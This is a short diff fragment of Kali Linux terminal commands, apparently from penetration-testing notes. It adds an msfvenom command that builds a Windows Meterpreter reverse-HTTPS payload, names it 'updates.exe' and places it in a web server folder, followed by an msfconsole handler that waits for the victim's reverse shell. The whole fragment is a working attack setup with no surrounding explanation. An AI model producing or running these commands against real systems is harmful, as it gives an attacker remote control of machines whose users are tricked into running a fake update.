@@ -1,0 +1,5 @@
+└─# msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.243.131 LPORT=4444 -f exe -o /var/www/html/updates.exe
+
+Start listening for new connection 
+┌──(root㉿kali)-[~]
+└─# msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST 192.168.243.131; set LPORT 4444; exploit"
